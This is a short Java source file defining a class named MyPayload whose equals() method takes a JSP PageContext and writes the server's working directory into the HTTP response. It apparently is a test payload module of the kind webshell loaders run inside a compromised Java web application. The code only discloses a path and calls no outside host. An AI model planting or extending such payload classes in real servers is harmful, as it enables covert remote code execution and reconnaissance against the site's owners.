package test;

import javax.servlet.jsp.PageContext;

public class MyPayload {
	public boolean equals(Object obj) {
		PageContext page = (PageContext) obj;
		try {
			String currentPath = new java.io.File("").getAbsolutePath();
			page.getResponse().getWriter().println(currentPath);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return true;
	}
}
